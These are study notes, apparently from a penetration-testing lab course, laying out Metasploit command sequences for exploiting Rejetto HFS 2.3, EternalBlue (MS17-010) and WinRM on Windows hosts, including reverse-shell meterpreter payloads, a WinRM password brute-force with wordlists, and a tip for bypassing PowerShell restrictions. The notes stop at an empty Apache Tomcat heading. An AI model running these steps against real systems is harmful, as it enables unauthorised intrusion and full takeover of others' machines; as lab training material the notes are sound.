

### Exploiting A vulnerable HTTP File server 

Http File server
- Web server that is designed for file & document sharing 
	- you can only host files (not websites etc)
	- webserver can be used for files and doc but can also be utilized to host a website
- HTTP file servers run on port 80 and use HTTP protocol for underlying communication 
- Rejetto HFS is a popular free and open source HTTP file server that can be setup on Windows and Linux 
- Rejetto HFD V2.3 is vulnerable to remote command and execution attacks 
- MSF has an exploits module that we can utilize to gain access to the target system hosting the HFS 
  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds

1. start up `postgreql` database 
2. start up `msfconsole` 
3. create workspace: `workspace -a HFS`
4. set up global variable: `setg rhosts target `
5. start with nmap scan: `db_nmap -sS -sV -O target ` the results will be stored in workspace 
6. directly search in msfconsole for module: `search type:exploit name:rejetto `
7. `use  exploit/windows/http/rejetto_hfs_exec ` -> `run` 
8. We can set payload to: `set payload windows/x64/meterpreter/reverse_tcp `
9. set `LPORT` and `LHOST` -> `run` 


### Exploiting the Windows MS17-010 SMB Vulnerability 
- the name of the exploit is EternalBlue 
- EternalBlue is a collection of Windows vulnerabilities and exploits that allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is part of 
- Takes advantage of vulnerability in Windows SMBv1 
- used in wannacry attack 
- Eternal Blue has MSF auxiliary module that can be used to check if a target system is vulnerable 
- Important: The Eternal Blue exploit will give us a *priviliged* meterpreter session on target system instead of a standard non-priviliged meterpreter session. This means complete control over the target system 

1) `msfconsole` 
2) create `workspace` 
3) setg rhosts
4) `db_nmap -sS -sV -O target` 
5) `services` (show the identified services in nmap)
6) find module that can see if system is vulnerable: `search type: auxiliary name: EternalBlue`
7) `use aux/scanner/smb/smb_ms17_010 `
8) if the results indicate that the system is vulnerable, look for the exploit: `search type:exploit name:EternalBlue ` --> `exploit/windows/smb/ms17_010_eternalblue`
9) check priviliged: `getuid` 
   (NT) AUTORITY SYTEM = highest priviliged possible (elevated meterpreter session no need for priviliged escalation)


### Exploiting WinRM (Windows Remote Management Protocol)

- WinRM is used for: 
	- Remotely access and interact with Windows hosts on a local network 
	- Remotely access and execute commands on Windows systems on the internet 
	- Manage and configure Windows system remotely 
- uses tcp port 5985 and 5986 
- Exploiting WinRM
	- WinRM implements access control and security for communication between systems through various forms of authentication 
	- Utilize the MSF to identify WinRM users and their passwords as well as execute commands on the target system 
	- Utilize a MSF WinRM exploit module to obtain a meterpreter session on the target system 


1) `msfconsole` 
2) create `workspace` 
3) setg rhosts
4) `db_nmap -sS -sV -p- -O target` 
5) `services`  (port 5985 of 5986 is winrm)
6) check authentication methods supported on target: `search type: auxiliary name: winrm` 
7) `use aux/scanner/winrm/winrm_auth_methods` --> `run` 
   ![[Pasted image 20230824215722.png]]
	Negotiate protocol supported, basic protocol supported means that we can do a bruteforce on the username and passwords. 
8) prepare the bruteforce: `search winrm_login` -> `use auxiliary/scanner/winrm/winrm_login `
	1) set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
	2) set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
9) when you have a hit on bruteforce, we will try to use the credentials `search winrm_cmd ` 
	1) `use auxiliary/scanner/winrm/winrm_cmd `
	2) `set USERNAME administrator `
	3) `set PASSWORD tinkerbell `
	4) specify command to run on target system to confirm that we have access: `set CMD whoami`
10) get meterpreter session through module: winrm_script 
	1) use exploit/windows/winrm/winrm_script_exec 
	2) set passwords,targetip,targeturi,username,lhost,lport 


![[Pasted image 20230824220529.png]]
When you have an issue with runtime -> set the force VBS (visual basic option) instead of the powershell command stager: `set FORCE_VBS true `. This can be useful if PowerShell is restricted or if VBS is more likely to bypass security controls on the target system. VBS is a scripting language developed by Microsoft. It's often used for administrative tasks and automation on Windows systems. In the context of penetration testing, it can be a viable alternative to PowerShell for executing commands or scripts on a target Windows machine. **PowerShell Command Stager**: PowerShell is a powerful scripting language on Windows systems. A "command stager" in Metasploit is a technique for delivering and executing payloads. However, in some scenarios, PowerShell may be restricted or blocked by security measures on the target system. 











###  Exploiting Vulnerable Apache Tomcat Web server 


